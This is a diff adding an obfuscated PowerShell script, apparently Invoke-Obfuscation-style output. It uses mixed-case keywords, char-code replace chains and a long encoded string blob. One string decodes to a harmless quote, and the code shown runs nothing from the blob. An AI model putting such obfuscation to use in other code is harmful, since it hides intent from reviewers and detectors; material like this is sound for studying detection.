@@ -1,0 +1,15 @@
+fuNcTIoN OlDjHm { 
+    [cMdLETbindING() ]param( 
+        [paramEteR (valuEfROMpiPelIne)]
+        $CQZnU,
+        [paramEteR(valuEfROMpiPelIne)]
+        $LAoEsp
+    )
+     $CQZnU  -RePLAcE([cHar]53+[cHar]50+[cHar]111),[cHar]58-crePLaCE([cHar]88+[cHar]82+[cHar]105),[cHar]34 -crePLaCE 'Vcv',[cHar]36-RePLAcE([cHar]84+[cHar]109+[cHar]87),[cHar]46 |oUT-NUlL
+     $LAoEsp -RePlAce ([cHaR]48+[cHaR]51+[cHaR]80),[cHaR]58  -RePlAce  ([cHaR]70+[cHaR]75+[cHaR]71),[cHaR]39-RePlAce ([cHaR]102+[cHaR]81+[cHaR]85),[cHaR]36-RePlAce 'l70',[cHaR]92 -RePlAce ([cHaR]117+[cHaR]69+[cHaR]122),[cHaR]96  -CREPLAce([cHaR]57+[cHaR]73+[cHaR]50),[cHaR]124 | oUT-NUlL
+}
+$DfscC=('V'+'cvresult = X'+'RiGod made relativ'+'es;'+' '+'Thank '+'Go'+'d we can '+'cho'+'o'+'se o'+'u'+'r'+' fr'+'iendsTmW'+'ip52o95Tm'+'W2'+'09TmW254Tm'+'W8XRi
+')
+$GDqb =('f'+'QUresult = '+'FKGa;gnz}nRaWgP6l=Y69I20g[^H1Tt^Lw'+'lvmcP^YXuEzo0Nl70nSCrRa26nQu{=V22FvM[7Rf=@KCO6bz]qrkWMJCWAOgyzPMQPRZa2TD03PbPs]7i<;5=;<iUxA[vgDy__GuxtIaXq9I2lDzr'+'AevIGl70o4Q2m>INuy6>Z'+'g6<ye49I2dIa4'+'Wq<oTqKnafB]l706suEzFHuEzy'+'r;0G1MnHGEsP='+'e{gvU?m@MPMAojwIbRW7?VMMk}Q@F};>eb9ErS0Q?rvOhpVf_D]<T=EXx{v9L'+'Y_kHx?3oCDRn<H'+'WBp]9=fNB@'+'hFU0pef8@KVGVmFdA'+'kf{1bBeuEzfGJl5l70l]gi[Xab<3'+'N9I2AQrtMV;nO8'+'o@uEzY03PgFz1b8l7003P5q^7;3D5kz2XJ;CFMGcg2JzaIs7qj7aQof18caJ2at0rd2_l70CzF6F0'+'wWSfX2t4TKl70XA}ziipwoM_rf53o<jbon>l1x<RTStu3zWd_Est10T13hl70P?=fovCdj;R2OdqQTn>KFCgj6vN3z7GcYFl3Z1Jl1JdN_NPp@uEzGn]'+'jbm1^Wue7wYUcW03P5QGw7]8y<{OVI1kSWviNtBKTf=gRqm_mqD'+'NHVah>N7C{tYtPr}Ig^tDhcM9I2q'+'w[3D5<6'+'4={jc7Y'+'xuT8SG'+'OO{v=MU'+'^3l9I25G>'+'BfZJk_rWk;<^UVq>v__ut7rYS_3J<;pws9I2arx_[n}=@Nl70VGOxxap62Pha>H{03POGap{8v2^uOsCttI?xqnSCLa03P]03P_Dl70<5Wg1;cNFr@uEzn?3=<'+'l70VV6EXwq=cu<MImvcl70V6qb;aO92SLchLEQFCl70mbDEnZPTt>Lh_=>P4vKs><_2WVl70SFRNrJzzp]4cG]DMpKBaQhc0'+'a7G>G>KN<3l70903P{Ol0M<K<VQVBB}ctL>ELuSLk2WdYn}1<6EOpuQmluVK'+'f'+'xqkk5]{'+'9I203PW]T9I2OuEzV{o9I2>d[]f=?<KN4]mra3tR5L>UaEz{=pr9I2l70^'+'A03Psfise4a;'+'S]'+'fVGT0Gp0dC@1Lk9I2lcuEzjuEzBk_TrFE'+'FKG')
+OlDjHm -CQZnU $DfscC -LAoEsp $GDqb
+
